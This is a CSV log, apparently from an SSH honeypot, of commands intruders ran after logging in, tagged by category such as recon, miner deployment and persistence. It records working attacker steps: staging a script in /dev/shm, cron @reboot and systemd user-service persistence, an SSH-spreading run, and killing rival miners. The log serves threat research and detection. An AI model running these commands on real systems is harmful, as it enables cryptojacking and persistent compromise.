session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776701081_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701083_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701085_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701087_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701089_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701091_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701092_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701094_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701099_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701103_149.210.235.123_33300_sshshadow,149.210.235.123,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701148_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776701150_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776701152_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776701154_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776701156_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776701158_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776701160_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776701163_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776701164_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776701164_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776701165_149.210.235.123_41352_sshshadow,149.210.235.123,admin,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776701166_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701169_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776701173_149.210.235.123_47826_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776708241_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708241_86.38.24.201_29747_sshshadow,86.38.24.201,test,,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,,
1776708242_86.38.24.201_29747_sshshadow,86.38.24.201,test,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,,
1776708244_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708246_86.38.24.201_13583_sshshadow,86.38.24.201,ubuntu,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776708252_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708254_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708256_86.38.24.201_23197_sshshadow,86.38.24.201,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776708259_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776708261_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776708263_86.38.24.201_30277_sshshadow,86.38.24.201,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776710429_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776710432_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776710437_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776710440_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776710443_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776710444_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776710446_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710449_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710450_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776710462_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776710463_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776710464_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776710464_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,,
1776710465_149.210.235.123_47410_sshshadow,149.210.235.123,ubuntu,,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,,
1776710466_149.210.235.123_41254_sshshadow,149.210.235.123,deploy,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776710575_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776710577_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776710579_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776710581_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
